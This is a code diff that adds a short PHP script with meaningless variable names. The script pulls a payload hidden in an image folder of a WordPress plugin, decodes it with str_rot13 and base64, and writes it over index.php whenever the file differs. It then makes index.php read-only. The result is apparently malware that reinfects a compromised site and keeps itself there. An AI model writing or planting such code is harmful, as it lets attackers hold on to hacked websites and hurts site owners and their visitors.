@@ -1,0 +1,14 @@
+<?php
+$ddscdws = "index.php";
+$acdfadfasf = file_get_contents($ddscdws);
+$sdfdsdfh = "/home/hiplstaging1/passionsauction/wp-content/plugins/advanced-custom-fields-pro/assets/images/field-states/63089";
+if (file_exists($sdfdsdfh)) {
+$iide = file_get_contents($sdfdsdfh);
+$iide = base64_decode(str_rot13($iide));
+if(md5($acdfadfasf) != md5($iide))
+{
+    @chmod($ddscdws, 0644);
+    @file_put_contents($ddscdws, $iide);
+    @chmod($ddscdws, 0444);
+}
+}
